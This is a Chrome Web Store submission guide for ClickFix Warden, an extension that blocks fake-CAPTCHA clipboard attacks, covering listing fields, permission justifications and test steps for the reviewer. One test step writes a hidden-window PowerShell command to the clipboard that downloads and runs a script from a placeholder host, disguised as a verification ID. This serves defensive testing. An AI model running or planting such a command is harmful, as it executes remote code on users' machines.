# Chrome Web Store

Upload `.output/clickfix-warden-<version>-chrome.zip` at https://chrome.google.com/webstore/devconsole. Opera add-ons take the same package.

## Store listing tab

- Description, the English description from `listing.md`.
- Category, Privacy & Security
- Language, English
- Store icon, `public/icon/128.png`
- Screenshots, `store/screenshots/1-*.png` to `5-*.png` (1280x800)
- Small promo tile, `store/screenshots/promo-440x280.png`
- Marquee promo tile, `store/screenshots/marquee-1400x560.png`
- Official URL, none
- Homepage URL, https://github.com/xVoidByte/ClickFixWarden
- Support URL, https://github.com/xVoidByte/ClickFixWarden/issues
- Mature content, no

## Privacy practices tab

**Single purpose**

Protects users from ClickFix and fake CAPTCHA social engineering attacks, and from sites reported as malicious, by checking pages and clipboard commands inside the browser.

**Permission justifications**

- storage, Saves the user's settings, trusted sites, the local detection log and the current detection rules on the device.
- unlimitedStorage, Keeps the downloaded list of reported addresses, tens of thousands of entries, in IndexedDB so every lookup happens on the device.
- alarms, Schedules the hourly download of the signed database and detection rules.
- webNavigation, Checks the address of each page the user opens against the local database before it loads, so known ClickFix sites can be stopped with a warning page.
- webRequest, Reads the IP address of the server a page comes from, without blocking or changing any request, to compare it with reported malware control servers.
- clipboardWrite, When a page has already put a malicious command in the clipboard, replaces it with a harmless note so that pasting it does nothing.
- Host permission (all sites), ClickFix pages appear on any domain, including hacked legitimate sites, so the content scripts that watch clipboard writes and paste instructions have to run on every page. The same permission lets the extension download its database from xvoidbyte.github.io.
- history (optional), Requested only when the user presses Check my history, to compare visited addresses with the local database inside the browser. The user can give it back with one click.
- management (optional), Requested only when the user presses Check installed extensions, to compare installed extension IDs with a list of known malicious ones. The user can give it back with one click.

**Are you using remote code?**

No. The extension downloads `hot.json`, `hot-delta.json`, `bulk.json` and `rules.json`, JSON data files signed with Ed25519. They hold addresses and text patterns that the packaged code reads, and they are never evaluated or run as code. All JavaScript ships inside the package.

**Data usage**

Tick none of the data types. ClickFix Warden does not collect or transmit any user data. Tick all three certifications (no selling, no unrelated use, no credit-worthiness use).

**Privacy policy URL**

https://xvoidbyte.github.io/ClickFixWarden/privacy.html

## Distribution tab

- Free, no in-app purchases
- Visibility, Public
- Regions, all regions

## Test instructions for the reviewer

1. Install the extension and open any web page, for example https://example.com.
2. Open the developer tools console on that page, run the line below, then click anywhere on the page within three seconds (the clipboard only accepts writes from a focused page)
   `setTimeout(() => navigator.clipboard.writeText('powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex" # I am not a robot - Verification ID: 1234'), 3000)`
3. A warning appears in the page that says in bold what was found and why it was stopped, the command itself is never shown. Pasting now gives a harmless note that starts with `# ClickFix Warden`.
4. Copying a normal install command, for example from https://rustup.rs, is not affected.
5. The settings page lists every option with a help icon, and the detection log shows the test above.
